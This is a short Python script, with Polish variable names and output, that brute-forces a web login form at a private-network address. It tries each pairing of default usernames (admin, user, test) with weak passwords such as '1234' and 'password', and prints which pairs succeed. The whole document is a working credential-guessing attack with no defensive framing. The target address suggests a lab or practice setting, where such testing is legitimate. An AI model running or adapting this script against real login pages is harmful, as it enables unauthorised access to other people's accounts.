import requests
url = ("http://192.168.1.197/login")
uzytkownicy = ["admin", "user", "test"]
hasla = ["1234", "password", "admin","123456"]
for uzyt in uzytkownicy:
    for haslo in hasla:
        dane = {"username": uzyt, "password": haslo}
        odp = requests.post(url, data=dane)
        if "zalogowano" in odp.text.lower() or odp.status_code == 302:
            print(f"[+] Udało się zalogować: {uzyt}:{haslo}")
        else:
            print(f"[-] Nieudane logowanie: {uzyt}:{haslo}")